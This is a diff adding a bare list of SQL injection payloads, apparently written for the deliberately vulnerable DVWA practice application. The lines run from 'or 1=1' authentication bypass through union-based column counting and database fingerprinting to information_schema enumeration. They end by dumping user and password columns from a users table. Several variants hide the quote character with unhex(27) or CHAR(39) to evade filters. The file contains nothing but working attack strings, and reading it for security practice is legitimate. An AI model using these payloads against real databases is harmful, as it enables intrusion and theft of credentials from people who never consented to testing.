@@ -1,0 +1,34 @@
+1 #
+1' or 1=1 #
+1' union select 1#
+1' union select 1,2#
+1' union select 1,2,3#
+1' union select 1,2,3,4#
+1' union select 1,2,3,4,5#
+'union select 1,version()#
+'union select 1,user()#
+'union select 1,database()#
+'union select 1,@@port#
+1' union select null, table_name from information_schema.tables where table_name='dvwa'#
+1' union select null, table_name from information_schema.tables #
+1' union select table_name,column_name from information_schema.columns where table_name='users'#
+1' union select user, password from users #
+unhex(27) or 1=1 #
+unhex(27) or 1=1 #
+CHAR(39) or 1=1 #
+unhex(27) union select 1#
+unhex(27) union select 1,2#
+unhex(27) union select 1,2,3#
+unhex(27) union select 1,2,3,4#
+unhex(27) union select 1,2,3,4,5#
+unhex(27) union select 1,version()#
+unhex(27) union select 1,user()#
+unhex(27) union select 1,database()#
+unhex(27) union select 1,@@port#
+unhex(27) union select table_name, 2 from information_schema.tables#
+unhex(27) union select null, table_name from information_schema.tables where table_name='dvwa'#
+unhex(27) union select null,table_name from information_schema.tables #
+unhex(27) union select table_name,column_name from information_schema.columns where table_name='users'#
+unhex(27) union select table_name,column_name from information_schema.columns where table_name=CHAR(117,115,101,114,115)#
+CHAR(39) union select table_name,column_name from information_schema.columns where table_name=CHAR(117,115,101,114,115)#
+unhex(27) union select user, password from users #
